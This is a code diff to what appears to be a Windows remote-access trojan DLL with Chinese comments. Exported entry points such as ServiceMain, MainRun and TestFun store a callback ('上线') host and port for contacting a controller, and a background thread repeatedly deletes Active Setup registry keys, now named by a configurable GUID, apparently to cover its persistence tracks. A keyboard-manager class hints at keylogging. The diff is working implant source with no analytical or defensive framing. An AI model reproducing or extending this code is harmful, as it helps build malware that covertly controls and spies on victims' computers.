@@ -14,7 +14,8 @@ struct Connect_Address
 	DWORD dwstact;
 	char  strIP[MAX_PATH];
 	int   nPort;
-}g_myAddress = { 0xCC28256,"",0 };
+	char  ActiveXKeyGuid[MAX_PATH];	// 查找创建的Guid
+}g_myAddress = { 0xCC28256,"",0,"" };
 
 
 DWORD WINAPI DelAXRegThread(LPVOID lpParam);
@@ -290,8 +291,8 @@ extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[])
 
 extern "C" __declspec(dllexport) void TestFun(char* strHost, int nPort)
 {
-	strcpy(g_strHost, strHost);  //保存上线地址
-	g_dwPort = nPort;             //保存上线端口
+	strcpy(g_strHost, strHost);   // 保存上线地址
+	g_dwPort = nPort;             // 保存上线端口
 	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strHost, 0, NULL);
 	//这里等待线程结束
 	WaitForSingleObject(hThread, INFINITE);
@@ -300,8 +301,8 @@ extern "C" __declspec(dllexport) void TestFun(char* strHost, int nPort)
 
 void TestFuns(char* strHost, int nPort)
 {
-	strcpy(g_strHost, strHost);  //保存上线地址
-	g_dwPort = nPort;             //保存上线端口
+	strcpy(g_strHost, strHost);   // 保存上线地址
+	g_dwPort = nPort;             // 保存上线端口
 	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strHost, 0, NULL);
 	//这里等待线程结束
 	WaitForSingleObject(hThread, INFINITE);
@@ -312,8 +313,8 @@ void TestFuns(char* strHost, int nPort)
 extern "C" __declspec(dllexport) void MainRun(HWND hwnd, HINSTANCE hinst, LPSTR lpCmdLine, int nCmdShow)
 {
 	MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DelAXRegThread, NULL, 0, NULL);
-	char strHost[] = "127.0.0.1";          //声明上线地址
-	int  nPort = 8088;                     //声明上线端口
+	char strHost[] = "127.0.0.1";          // 声明上线地址
+	int  nPort = 8088;                     // 声明上线端口
 	TestFuns(strHost, nPort);
 }
 
@@ -346,30 +347,21 @@ extern "C" __declspec(dllexport) void FirstRun(HWND hwnd, HINSTANCE hinst, LPSTR
 
 DWORD WINAPI DelAXRegThread(LPVOID lpParam)
 {
-	char strFileName[MAX_PATH];     //dll文件名
-	char *pstrTemp = NULL;
-	char ActiveXStr[1024];           //activex 键值字符串
-	char ActiveXStr32[1024];           //activex 键值字符串
-
+	char ActiveXStr[1024];             // activex 键值字符串
+	char ActiveXStr32[1024];           // activex 键值字符串
 	ZeroMemory(ActiveXStr, 1024);
-	ZeroMemory(strFileName, MAX_PATH);
 	ZeroMemory(ActiveXStr32, 1024);
 
-	//得到自身文件名
-	GetModuleFileName(CKeyboardManager::g_hInstance, strFileName, MAX_PATH);
-	PathStripPath(strFileName); //将完整文件名转换为文件名
-	pstrTemp = strstr(strFileName, ".dll");  //寻找 .dll然后将他删除掉
-	if (pstrTemp != NULL)
+	if (g_myAddress.ActiveXKeyGuid != NULL)
 	{
-		ZeroMemory(pstrTemp, strlen(pstrTemp));  //删除掉扩展名
 		//构造键值
-		sprintf(ActiveXStr, "%s%s", "Software\\Microsoft\\Active Setup\\Installed Components\\", strFileName);
-		sprintf(ActiveXStr32, "%s%s", "Software\\Wow6432Node\\Microsoft\\Active Setup\\Installed Components\\", strFileName);
+		sprintf(ActiveXStr, "%s%s", "Software\\Microsoft\\Active Setup\\Installed Components\\", g_myAddress.ActiveXKeyGuid);
+		sprintf(ActiveXStr32, "%s%s", "Software\\Wow6432Node\\Microsoft\\Active Setup\\Installed Components\\", g_myAddress.ActiveXKeyGuid);
 		while (1)
 		{
 			//不停的删除注册表
 			RegDeleteKey(HKEY_CURRENT_USER, ActiveXStr);
-			OutputDebugString(ActiveXStr);      //输出删除的字串用以测试
+			OutputDebugString(ActiveXStr);      // 输出删除的字串用以测试
 			RegDeleteKey(HKEY_CURRENT_USER, ActiveXStr32);
 			OutputDebugString(ActiveXStr32);  
 			Sleep(1000 * 30);
